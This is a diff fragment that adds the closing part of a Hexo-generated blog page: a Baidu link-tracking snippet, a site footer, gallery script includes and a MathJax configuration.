+    !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=window.location.href,o=document.referrer;if(!e.test(r)){var n="//api.share.baidu.com/s.gif";o?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var t=new Image;t.src=n}}(window);
+</script>     
+</section>
+        </div>
+        <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            wintrysec &copy; 2020 
+            <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/80x15.png" /></a>
+            <br> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>. Theme - <a href="https://github.com/zthxxx/hexo-theme-Wikitten" target="_blank" rel="noopener">wikitten</a>
+            
+                <br>
+                <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i> <span id="busuanzi_value_site_pv"></span></span>
+                &nbsp;|&nbsp;
+                <span id="busuanzi_container_site_pv"><i class="fa fa-user"></i> <span id="busuanzi_value_site_uv"></span></span>
+            
+        </div>
+    </div>
+</footer>
+
+        
+
+    
+        
+<script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-share.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-video.min.js"></script>
+
+    
+    
+        
+<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+    
+    
+        <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true,
+            TeX: {
+                equationNumbers: {
+                  autoNumber: 'AMS'
+                }
+            }
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script async src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    
+
+
+
+<!-- Custom Scripts -->
+
+<script src="/js/main.js"></script>
+
+
+    </div>
+</body>
+</html>
